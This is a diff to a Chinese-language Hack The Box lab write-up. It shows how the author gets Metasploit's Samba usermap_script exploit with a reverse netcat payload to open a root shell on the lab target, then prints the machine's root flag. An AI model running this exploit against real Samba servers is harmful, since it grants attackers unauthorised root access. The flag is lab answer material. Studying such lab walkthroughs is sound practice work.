@@ -49,6 +49,7 @@ drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
 看起来没什么可以利用的东西。入口应该不在这里。
 
 **port 22**
+
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
 
 这里SSH没有更多信息，想要打入口只能暴力破解，不符合考试思路，所以大概率不是入口点，可以看下一个了。
@@ -160,3 +161,73 @@ smb: \> pwd
 Current directory is \\10.10.10.3\tmp\
 ```
 能读取的只有最后两个文件。
+
+但是看了文件内容，没找到太多东西。
+
+刚好重新开启机器，顺手看了一下靶机标签，里面有RCE和CVE-2007-XXXX，为了保证尽量还原考试场景，就不去仔细看这些提示了，2007是samba 3.0.20 exploit的时间，猜测入口点还是在这个exploit的位置。
+
+重新跑msf，提示还是`Exploit completed, but no session was created.`google排查了一下，找了[一篇文章](https://forum.hackthebox.com/t/solved-exploit-completed-but-no-sessions-created/2488/13)。
+
+这里的问题点其实是需要把msf的监听改为VPN的IP地址（如果虚拟机开了NAT没准要改桥接）
+
+### 漏洞利用
+
+解决及最后漏洞利用如下：
+```
+[*] Started reverse TCP handler on 192.168.43.253:4444 
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identif
+                                      ier, or hosts file with syntax 'file:<
+                                      path>'
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.43.253   yes       The listen address (an interface may be
+                                      specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.16.2
+LHOST => 10.10.16.2
+msf6 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP handler on 10.10.16.2:4444 
+[-] 10.10.10.3:139 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.3:139).
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/samba/usermap_script) > set rport 445
+rport => 445
+msf6 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP handler on 10.10.16.2:4444 
+[*] Command shell session 1 opened (10.10.16.2:4444 -> 10.10.10.3:38190) at 2022-08-18 21:35:01 -0500
+
+whoami
+root
+pwd
+/
+cd /root
+ls
+Desktop
+reset_logs.sh
+root.txt
+vnc.log
+cat root.txt
+9af33e023af6654cab827d958fcf265f
+```
